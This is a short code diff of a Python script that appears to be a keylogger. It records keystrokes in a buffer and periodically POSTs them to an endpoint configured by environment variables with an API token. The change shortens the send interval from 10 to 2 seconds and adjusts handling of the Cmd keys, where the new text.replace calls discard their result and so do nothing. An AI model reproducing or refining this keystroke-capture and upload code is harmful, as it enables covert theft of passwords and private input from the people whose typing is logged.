@@ -15,7 +15,7 @@ PROD_API_URL = os.environ.get("PROD_API_URL")
 API_TOKEN = os.environ.get("API_TOKEN")
 
 text = ""
-time_interval = 10
+time_interval = 2
 
 if ENV == "prod":
     endpoint = PROD_API_URL
@@ -33,11 +33,12 @@ def send_post_req():
 
 def on_press(key):
     global text
-    
     if key == keyboard.Key.enter:
         text += "\n"
     elif key == keyboard.Key.cmd:
-        text.replace("Key.cmd","CMD")
+        text.replace("Key.cmd"," ")
+    elif key == keyboard.Key.cmd_r:
+        text.replace("Key.cmd_r"," ")
     elif key == keyboard.Key.tab:
         text += "\t"
     elif key == keyboard.Key.space:
